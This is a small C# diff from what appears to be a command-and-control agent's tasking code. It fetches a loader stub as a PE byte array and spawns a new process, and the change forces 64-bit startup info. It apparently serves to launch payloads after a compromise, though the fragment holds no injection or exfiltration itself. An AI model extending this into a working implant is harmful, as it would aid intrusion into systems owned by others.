@@ -133,7 +133,7 @@ namespace Tasks
                         {
                             if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
                             {
-                                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
+                                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);
                                 proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
                                 if (proc.Start())
                                 {
